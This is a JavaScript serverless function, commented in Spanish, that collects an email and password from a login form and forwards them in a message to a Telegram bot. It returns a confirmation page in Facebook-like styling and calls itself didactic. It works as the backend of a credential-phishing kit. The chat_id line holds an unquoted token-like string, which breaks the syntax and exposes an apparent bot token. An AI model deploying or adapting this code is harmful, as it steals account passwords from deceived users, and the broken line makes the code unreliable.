// ==========================================================
//  Función serverless de Vercel   /api/login
//  Recibe el formulario, lo manda a un bot de Telegram
// ==========================================================

export default async function handler(req, res) {
  const metodo = req.method; // "POST" o "GET"

  // Según el método, los datos llegan en un lugar distinto:
  const datos = metodo === "POST" ? req.body : req.query;

  const email = datos?.email || "(vacío)";
  const password = datos?.password || "(vacío)";

  // ----- Enviar a Telegram -----
  // El token y el chat id se leen de las Variables de Entorno
  // de Vercel (Settings -> Environment Variables), NO se ponen
  // aquí en el código.
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (BOT_TOKEN && CHAT_ID) {
    const texto =
      `Nuevo envío (${metodo})\n` +
      `Correo: ${email}\n` +
      `Contraseña: ${password}`;

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: 8723902701:AAHCnrKYTzGnQwfsJRvngBh8zA4xXDg6Nig, text: texto }),
      });
    } catch (error) {
      console.log("No se pudo enviar a Telegram:", error);
    }
  }

  // ----- Página de respuesta (didáctica) -----
  const html = `
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Datos recibidos</title>
  <style>
    body {
      font-family: -apple-system, "Segoe UI", Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .caja {
      background: #fff;
      padding: 32px 40px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,.15);
      max-width: 520px;
      width: 90%;
    }
    h1 { color: #1877f2; margin-top: 0; }
    .metodo {
      display: inline-block;
      background: #1877f2;
      color: #fff;
      padding: 4px 12px;
      border-radius: 6px;
      font-weight: 600;
    }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    td { padding: 10px 8px; border-bottom: 1px solid #eee; }
    td.campo { font-weight: 600; width: 130px; color: #606770; }
    .nota { margin-top: 20px; font-size: 14px; color: #606770; }
    a { color: #1877f2; text-decoration: none; font-weight: 600; }
  </style>
</head>
<body>
  <div class="caja">
    <h1>Datos recibidos</h1>
    <p>Método usado: <span class="metodo">${metodo}</span></p>

    <table>
      <tr><td class="campo">Correo</td><td>${email}</td></tr>
      <tr><td class="campo">Contraseña</td><td>${password}</td></tr>
    </table>

    <p class="nota">
      Estos datos también se enviaron al bot de Telegram.
      Con <b>POST</b> los datos viajan en el cuerpo de la petición
      y no aparecen en la URL. Con <b>GET</b> viajan en la URL,
      así: <code>?email=...&amp;password=...</code>
    </p>

    <p><a href="/">← Volver</a></p>
  </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.status(200).send(html);
}
